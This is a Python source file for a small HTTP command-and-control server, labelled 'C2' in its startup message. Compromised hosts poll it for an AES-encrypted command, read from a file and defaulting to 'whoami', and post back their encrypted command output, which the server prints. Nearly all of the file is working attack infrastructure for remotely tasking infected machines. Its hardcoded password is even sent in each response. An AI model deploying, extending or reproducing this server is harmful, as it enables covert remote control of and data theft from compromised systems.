import http.server
import socketserver
import os

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64
import hashlib


IP_BIND = "0.0.0.0"  
PORT = 8081            
AES_PWD = "p4ssw0rd"


def get_aes_key(password):
    return hashlib.sha256(password.encode()).digest()

def aes_decrypt(enc_data, password):
    """Decrypt the data using AES encryption."""
    key = get_aes_key(password)
    enc_data_bytes = base64.b64decode(enc_data)
    iv = enc_data_bytes[:16]  # Get the IV from the start
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(enc_data_bytes[16:]), AES.block_size)
    return pt.decode('utf-8')

def aes_encrypt(data, password):
    """Encrypt the data using AES encryption."""
    key = get_aes_key(password)
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
    iv = cipher.iv
    return base64.b64encode(iv + ct_bytes).decode('utf-8')



class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    
    def do_GET(self):
        try:
            decoded_path = self.path[1:]
            
            if decoded_path == "1":

                if os.path.isfile("cmd.txt"):
                    with open("cmd.txt", "r") as file:
                        cmd_content = file.read().strip()
                        if not cmd_content:
                            cmd_content = "whoami" #default

                    response_content = "P:" + AES_PWD + ":" + aes_encrypt(f"CMD:{cmd_content}",AES_PWD)

                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(response_content.encode('utf-8'))

                    os.remove("cmd.txt")

                else:

                    not_here_msg = "NO"

                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(not_here_msg.encode('utf-8'))

            else:

                self.send_response(404)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Invalid path!")
        
        except Exception as e:
            print(f"Error handling GET request")
            self.send_response(500)
            self.end_headers()





    def do_POST(self):

        try:

            decoded_path = self.path[1:]

            if decoded_path == "2":

                content_length = int(self.headers['Content-Length'])

                post_data = self.rfile.read(content_length)

                print("====================================================")
                print(aes_decrypt(post_data,AES_PWD))
                print("====================================================")


                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Output received successfully.")
            else:

                self.send_response(404)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(b"Invalid path!")
        

        except Exception as e:
            print(f"Error handling POST request")
            self.send_response(500)
            self.end_headers()




with socketserver.TCPServer((IP_BIND, PORT), MyHttpRequestHandler) as httpd:
    print(f"C2 on {IP_BIND} port {PORT} (http://{IP_BIND}:{PORT})")
    httpd.serve_forever()
